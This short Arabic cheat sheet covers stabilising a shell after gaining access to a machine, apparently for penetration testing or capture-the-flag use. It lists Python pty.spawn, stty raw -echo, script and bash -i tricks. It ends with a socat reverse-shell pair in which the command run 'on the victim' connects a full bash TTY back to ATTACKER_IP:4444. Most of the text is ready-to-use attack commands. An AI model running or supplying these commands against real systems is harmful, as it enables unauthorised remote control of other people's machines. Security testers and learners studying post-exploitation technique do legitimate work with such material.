#  Python PTY (

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

أو:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# ماذا يفعل؟

- يحول الـ shell إلى interactive shell
- يدعم:
    - clear
    - tab
    - ctrl+c بشكل أفضل

---
# بعد PTY → ضبط TTY كامل 

اضغط:

```
CTRL + Z
```

ثم على جهازك:

```
stty raw -echo; fg
```

ثم داخل الشل:

```
reset
export TERM=xterm
stty rows 40 columns 120
```

---
# باستخدام script

```
script /dev/null -c bash
```

أو:

```
script -qc /bin/bash /dev/null
```

---
# باستخدام bash interactive

```
bash -i
```

# مفيد لتحسين الشل قليلًا.

---
# باستخدام sh interactive

```
sh -i
```


---

# باستخدام socat 

على جهازك:

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

على الضحية:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

# يعطيك:

- Full TTY
- Stable shell
- Ctrl+C شغال
- Tab completion

---
